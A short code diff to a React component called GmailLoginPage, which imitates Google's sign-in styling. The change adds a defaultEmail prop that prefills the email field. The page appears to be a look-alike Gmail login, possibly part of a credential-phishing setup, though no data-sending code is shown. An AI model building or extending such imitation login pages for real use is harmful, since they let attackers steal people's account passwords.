@@ -5,6 +5,7 @@ import Spinner from './common/Spinner';
 interface GmailLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
+  defaultEmail?: string;
 }
 
 // Custom floating label input for Google style
@@ -35,8 +36,8 @@ const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false 
 };
 
 
-const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
-  const [email, setEmail] = useState('');
+const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+  const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
   const [pageReady, setPageReady] = useState(false);
